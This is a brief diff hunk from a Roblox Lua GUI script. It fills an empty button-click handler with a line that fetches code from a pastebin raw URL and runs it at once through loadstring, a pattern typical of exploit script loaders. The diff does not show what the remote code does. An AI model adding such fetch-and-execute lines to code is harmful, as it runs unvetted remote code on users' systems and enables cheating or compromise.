@@ -223,7 +223,7 @@ TextButton_3.TextScaled = true
 TextButton_3.TextSize = 14.000
 TextButton_3.TextWrapped = true
 TextButton_3.MouseButton1Down:connect(function()
-	
+	loadstring(game:HttpGet('https://pastebin.com/raw/jEVxSr36', true))()
 end)
 
 UICorner_7.Parent = TextButton_3
